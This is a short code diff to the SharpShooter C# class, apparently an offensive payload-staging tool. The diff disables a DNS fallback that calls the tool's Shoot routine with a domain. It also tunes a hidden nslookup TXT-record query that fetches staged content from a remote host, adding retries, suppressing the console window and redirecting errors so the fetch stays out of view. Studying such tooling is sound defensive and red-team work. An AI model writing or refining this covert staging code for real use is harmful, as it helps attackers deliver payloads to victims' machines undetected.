@@ -66,7 +66,7 @@ public class SharpShooter
         catch(Exception e)
         {
             //MessageBox.Show(e.Message);
-            try
+            /*try
             {
                 // if an error occurs, fall back to try DNS
                 // extract the domain
@@ -75,7 +75,7 @@ public class SharpShooter
                 string Domain = uri.Host;
                 ss.Shoot(Refs, NameSpace, EntryPoint, false, Domain);
             }
-            catch { }
+            catch { }*/
         }
     }
 
@@ -101,10 +101,12 @@ public class SharpShooter
         string pattern = string.Format(@"{0}\s*text =\s*([""])(.*?)([""])", hostname);
         string val = @"([""])(.*?)([""])";
         var startInfo = new ProcessStartInfo("nslookup");
-        startInfo.Arguments = string.Format("-type=TXT -timeout=5 {0}", hostname);
+        startInfo.Arguments = string.Format("-type=TXT -retry=3 -timeout=6 {0}", hostname);
         startInfo.RedirectStandardOutput = true;
+        startInfo.RedirectStandardError = true;
         startInfo.UseShellExecute = false;
         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+        startInfo.CreateNoWindow = true;
 
         using (var cmd = Process.Start(startInfo))
         {
